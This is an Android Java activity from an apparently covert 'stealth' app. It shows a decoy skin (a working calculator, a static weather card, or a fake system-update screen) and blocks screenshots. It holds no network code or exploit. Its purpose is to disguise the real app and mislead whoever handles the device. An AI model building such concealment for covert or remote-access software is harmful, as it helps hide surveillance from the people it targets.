package com.fason.app.stealth.decoy;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import com.fason.app.R;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Decoy engine — single activity hosting calculator / weather / system-update
 * skins. Upgrade of Lab-RATS DecoyActivity: runtime-switchable skins, working
 * calculator logic, simulated update progress, and a secure-window flag so the
 * decoy itself resists screenshots.
 */
public final class DecoyActivity extends AppCompatActivity {

    public static final String EXTRA_SKIN = "skin";
    public static final int SKIN_CALCULATOR = 1;
    public static final int SKIN_WEATHER = 2;
    public static final int SKIN_UPDATE = 3;

    private int skin = SKIN_CALCULATOR;
    private final Handler handler = new Handler(Looper.getMainLooper());

    public static void launch(Context ctx, int skin) {
        Intent i = new Intent(ctx, DecoyActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        i.putExtra(EXTRA_SKIN, skin);
        ctx.startActivity(i);
    }

    public static int getPreferredSkin(Context ctx) {
        return ctx.getSharedPreferences("decoy", MODE_PRIVATE)
            .getInt("skin", SKIN_CALCULATOR);
    }

    @Override
    protected void onCreate(Bundle state) {
        super.onCreate(state);
        getWindow().setFlags(
            android.view.WindowManager.LayoutParams.FLAG_SECURE,
            android.view.WindowManager.LayoutParams.FLAG_SECURE);
        skin = getIntent().getIntExtra(EXTRA_SKIN, getPreferredSkin(this));
        switch (skin) {
            case SKIN_WEATHER: renderWeather(); break;
            case SKIN_UPDATE: renderUpdate(); break;
            case SKIN_CALCULATOR:
            default: renderCalculator(); break;
        }
    }

    // ---------------- Calculator ----------------

    private TextView calcDisplay;
    private String calcExpr = "";

    @SuppressLint("SetTextI18n")
    private void renderCalculator() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.rgb(18, 18, 22));
        root.setPadding(32, 64, 32, 32);

        calcDisplay = new TextView(this);
        calcDisplay.setTextColor(Color.WHITE);
        calcDisplay.setTextSize(42);
        calcDisplay.setGravity(Gravity.END);
        calcDisplay.setText("0");
        LinearLayout.LayoutParams dlp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f);
        root.addView(calcDisplay, dlp);

        String[][] keys = {
            {"C", "(", ")", "÷"},
            {"7", "8", "9", "×"},
            {"4", "5", "6", "−"},
            {"1", "2", "3", "+"},
            {"0", ".", "⌫", "="}
        };
        for (String[] row : keys) {
            LinearLayout rowLayout = new LinearLayout(this);
            rowLayout.setOrientation(LinearLayout.HORIZONTAL);
            LinearLayout.LayoutParams rlp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f);
            root.addView(rowLayout, rlp);
            for (String k : row) {
                Button b = new Button(this);
                b.setText(k);
                b.setTextSize(22);
                b.setTextColor(Color.WHITE);
                b.setBackgroundColor(Color.rgb(35, 35, 42));
                b.setOnClickListener(v -> onCalcKey(k));
                LinearLayout.LayoutParams blp = new LinearLayout.LayoutParams(
                    0, LinearLayout.LayoutParams.MATCH_PARENT, 1f);
                blp.setMargins(6, 6, 6, 6);
                rowLayout.addView(b, blp);
            }
        }
        setContentView(root);
    }

    private void onCalcKey(String k) {
        switch (k) {
            case "C": calcExpr = ""; break;
            case "⌫":
                if (!calcExpr.isEmpty()) calcExpr = calcExpr.substring(0, calcExpr.length() - 1);
                break;
            case "=":
                calcExpr = String.valueOf(safeEval(calcExpr));
                break;
            default:
                calcExpr += k;
        }
        calcDisplay.setText(calcExpr.isEmpty() ? "0" : calcExpr);
    }

    private double safeEval(String expr) {
        try {
            String e = expr.replace("÷", "/").replace("×", "*").replace("−", "-")
                .replaceAll("[^0-9+\\-*/().]", "");
            return evalExpr(e);
        } catch (Exception ex) {
            return 0;
        }
    }

    /** Shunting-yard evaluation — no external deps. */
    private double evalExpr(String s) {
        java.util.List<Double> vals = new java.util.ArrayList<>();
        java.util.List<Character> ops = new java.util.ArrayList<>();
        int i = 0;
        while (i < s.length()) {
            char c = s.charAt(i);
            if (Character.isDigit(c) || c == '.') {
                StringBuilder num = new StringBuilder();
                while (i < s.length()
                        && (Character.isDigit(s.charAt(i)) || s.charAt(i) == '.')) {
                    num.append(s.charAt(i++));
                }
                vals.add(Double.parseDouble(num.toString()));
            } else if (c == '(') {
                ops.add(c); i++;
            } else if (c == ')') {
                while (!ops.isEmpty() && ops.get(ops.size() - 1) != '(') {
                    vals.add(applyOp(ops.remove(ops.size() - 1),
                        vals.remove(vals.size() - 2), vals.remove(vals.size() - 1)));
                }
                if (!ops.isEmpty()) ops.remove(ops.size() - 1);
                i++;
            } else if ("+-*/".indexOf(c) >= 0) {
                while (!ops.isEmpty() && prec(ops.get(ops.size() - 1)) >= prec(c)) {
                    vals.add(applyOp(ops.remove(ops.size() - 1),
                        vals.remove(vals.size() - 2), vals.remove(vals.size() - 1)));
                }
                ops.add(c); i++;
            } else {
                i++;
            }
        }
        while (!ops.isEmpty()) {
            vals.add(applyOp(ops.remove(ops.size() - 1),
                vals.remove(vals.size() - 2), vals.remove(vals.size() - 1)));
        }
        return vals.isEmpty() ? 0 : vals.get(0);
    }

    private int prec(char op) {
        return (op == '*' || op == '/') ? 2 : (op == '+' || op == '-') ? 1 : 0;
    }

    private double applyOp(char op, double a, double b) {
        switch (op) {
            case '+': return a + b;
            case '-': return a - b;
            case '*': return a * b;
            case '/': return b == 0 ? 0 : a / b;
            default: return 0;
        }
    }

    // ---------------- Weather ----------------

    private void renderWeather() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setBackgroundColor(Color.rgb(28, 42, 68));
        root.setPadding(48, 48, 48, 48);

        String city = "Springfield";
        TextView tvCity = new TextView(this);
        tvCity.setText(city);
        tvCity.setTextColor(Color.WHITE);
        tvCity.setTextSize(30);
        tvCity.setGravity(Gravity.CENTER);
        root.addView(tvCity);

        TextView tvTemp = new TextView(this);
        tvTemp.setText("21°C");
        tvTemp.setTextColor(Color.WHITE);
        tvTemp.setTextSize(72);
        tvTemp.setGravity(Gravity.CENTER);
        root.addView(tvTemp);

        TextView tvCond = new TextView(this);
        tvCond.setText("Partly cloudy");
        tvCond.setTextColor(Color.rgb(190, 205, 230));
        tvCond.setTextSize(18);
        tvCond.setGravity(Gravity.CENTER);
        root.addView(tvCond);

        String now = new SimpleDateFormat("EEEE, MMM d  HH:mm", Locale.getDefault())
            .format(new Date());
        TextView tvTime = new TextView(this);
        tvTime.setText(now);
        tvTime.setTextColor(Color.rgb(150, 165, 195));
        tvTime.setTextSize(14);
        tvTime.setGravity(Gravity.CENTER);
        tvTime.setPadding(0, 32, 0, 0);
        root.addView(tvTime);

        setContentView(root);
    }

    // ---------------- System update ----------------

    private void renderUpdate() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setBackgroundColor(Color.rgb(12, 12, 16));
        root.setPadding(48, 48, 48, 48);

        ProgressBar pb = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        pb.setIndeterminate(true);
        LinearLayout.LayoutParams pblp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        root.addView(pb, pblp);

        TextView tv = new TextView(this);
        tv.setText("Checking for system updates…");
        tv.setTextColor(Color.WHITE);
        tv.setTextSize(16);
        tv.setGravity(Gravity.CENTER);
        tv.setPadding(0, 24, 0, 0);
        root.addView(tv);

        setContentView(root);

        handler.postDelayed(() -> {
            tv.setText("Your device is up to date");
            pb.setIndeterminate(false);
            pb.setMax(100);
            pb.setProgress(100);
        }, 9000);
    }

    @Override
    protected void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }
}
